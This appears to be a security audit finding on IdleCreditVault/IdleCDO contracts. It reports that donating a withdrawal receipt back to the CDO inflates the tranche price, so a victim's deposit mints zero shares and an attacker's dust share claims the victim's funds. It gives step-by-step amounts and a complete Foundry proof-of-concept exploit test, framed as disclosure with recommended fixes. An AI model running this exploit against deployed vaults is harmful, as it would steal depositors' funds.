### Title
Withdrawal-receipt donation inflates tranche NAV and lets a dust holder seize deposits - (File: contracts/strategies/idle/IdleCreditVault.sol)

### Summary

`IdleCreditVault` withdrawal receipts are ordinary transferable strategy tokens, while `IdleCDOCreditVault.getContractValue()` counts every strategy token held by the CDO as active NAV. An attacker can donate a pending-withdrawal receipt back to the CDO, crystallize it as artificial profit, cause a victim deposit to mint zero or dust tranche shares, and withdraw the inflated NAV through a dust tranche position.

### Finding Description

`requestWithdraw` burns active strategy tokens from the CDO but mints a transferable receipt to the requesting user and records an independent pending claim. [1](#0-0)  Because the receipt remains an unrestricted ERC20 token, the user can transfer it back to the CDO. [2](#0-1) 

`getContractValue()` blindly counts the CDO's whole strategy-token balance. [3](#0-2)  The next deposit calls `_updateAccounting()` before minting shares, so the donated pending receipt is treated as new yield and raises the tranche price. [4](#0-3)  Shares are then minted solely as `_amount * ONE_TRANCHE_TOKEN / _tranchePrice(_tranche)`. [5](#0-4) 

The donation guard does not stop this because `_skimDonatedAssets()` only removes raw underlying tokens, not the strategy token. [6](#0-5)  A second `requestWithdraw` calls `_updateAccounting()`, values the dust tranche at the inflated price, burns the donated strategy-token balance as though it were active principal, and creates another receipt for the attacker. [7](#0-6)  `_withdrawOps` simultaneously burns the attacker's dust tranche and subtracts the full inflated underlying amount from saved NAV. [8](#0-7) 

### Impact Explanation

In an 18-decimal underlying deployment, a concrete sequence is:

1. Attacker A deposits `1` wei and retains one dust AA share.
2. Attacker B deposits `D`, requests a full withdrawal, receives a receipt for approximately `D`, and transfers that receipt to the CDO.
3. Victim deposits `A < D`; accounting first prices A's one share at roughly `D + 1`, so integer division mints zero tranche shares while NAV increases by `A`.
4. Attacker A requests withdrawal of the one dust share and receives a receipt for approximately `D + A + 1`.

The consortium spends `D + 1` and receives a claim for `D + A + 1`, stealing the victim's entire `A`. In addition, B's pending withdrawal remains recorded even though B's receipt was donated and subsequently burned as active CDO principal, leaving an unclaimable funded liability and a second source of insolvency. [9](#0-8) 

### Likelihood Explanation

The attack requires two attacker-controlled KYC-passing lender addresses, an ordinary deposit, an ordinary withdrawal request, and one direct ERC20 transfer. It executes during the buffer phase, where withdrawal requests are allowed, and does not require a privileged or malicious borrower, owner, manager, oracle failure, or market condition.

The strongest deterministic variant uses an 18-decimal underlying because depositing one wei creates one share backed by one wei of NAV. With lower-decimal underlying tokens, the minimum retained share/NAV ratio is larger, but the same accounting flaw remains whenever sufficient price appreciation or donation size makes the victim's minted amount round to zero or economically negligible dust.

### Recommendation

Do not use raw `balanceOf(strategyToken)` as active NAV. Track active strategy-token backing internally and exclude unsolicited strategy-token transfers from `getContractValue()` and `_managedContractValue()`. As defense in depth, prevent receipt tokens from being transferred to `idleCDO`, or replace transferable withdrawal receipts with non-transferable receipt accounting. Any recovery mechanism must also handle pending claims whose receipt tokens were surrendered to or burned from the CDO.

### Proof of Concept

A Foundry fork PoC can reproduce the exploit with an 18-decimal underlying, APR `0`, fees `0`, AYS disabled, and the pool in the buffer phase:

```solidity
function testReceiptDonationInflatesNAVAndStealsDeposit() external {
    address attackerA = makeAddr("attackerA");
    address attackerB = makeAddr("attackerB");
    address victim = makeAddr("victim");

    uint256 donationDeposit = 2_000 ether;
    uint256 victimDeposit = 1_000 ether;

    vm.prank(owner);
    cdoEpoch.setIsAYSActive(false);
    vm.prank(manager);
    IdleCreditVault(strategy).setAprs(0, 0);

    deal(underlying, attackerA, 1);
    deal(underlying, attackerB, donationDeposit);
    deal(underlying, victim, victimDeposit);

    // Attacker A retains one dust share backed by one wei.
    vm.startPrank(attackerA);
    IERC20Detailed(underlying).approve(address(cdoEpoch), 1);
    cdoEpoch.depositAA(1);
    vm.stopPrank();

    // Attacker B deposits and converts the position into a receipt.
    vm.startPrank(attackerB);
    IERC20Detailed(underlying).approve(address(cdoEpoch), donationDeposit);
    cdoEpoch.depositAA(donationDeposit);
    cdoEpoch.requestWithdraw(donationDeposit, address(AAtranche));
    uint256 receipt = IERC20Detailed(strategy).balanceOf(attackerB);
    IERC20Detailed(strategy).transfer(address(cdoEpoch), receipt);
    vm.stopPrank();

    // Victim mints zero shares at the receipt-inflated price.
    vm.startPrank(victim);
    IERC20Detailed(underlying).approve(address(cdoEpoch), victimDeposit);
    uint256 minted = cdoEpoch.depositAA(victimDeposit);
    vm.stopPrank();
    assertEq(minted, 0);

    // Attacker A converts the dust share into a receipt for all phantom NAV.
    vm.prank(attackerA);
    uint256 stolenReceipt = cdoEpoch.requestWithdraw(1, address(AAtranche));
    assertEq(stolenReceipt, donationDeposit + victimDeposit + 1);

    // Fund and settle the pending requests.
    vm.prank(manager);
    cdoEpoch.startEpoch();
    vm.warp(cdoEpoch.epochEndDate() + 1);
    deal(underlying, borrower, IERC20Detailed(underlying).balanceOf(borrower) +
        IdleCreditVault(strategy).pendingWithdraws());
    vm.prank(borrower);
    IERC20Detailed(underlying).approve(address(cdoEpoch), type(uint256).max);
    vm.prank(manager);
    cdoEpoch.stopEpoch(0, 0);

    vm.prank(attackerA);
    cdoEpoch.claimWithdrawRequest();
    assertEq(IERC20Detailed(underlying).balanceOf(attackerA), stolenReceipt);

    // B's pending claim is permanently unclaimable: its receipt was burned as NAV.
    vm.prank(attackerB);
    vm.expectRevert();
    cdoEpoch.claimWithdrawRequest();
}
```

Expected result: the victim receives zero tranche shares, attacker A receives `D + A + 1`, and attacker B's funded receipt is unclaimable, proving both theft of the victim deposit and broken one-receipt-one-payout accounting.
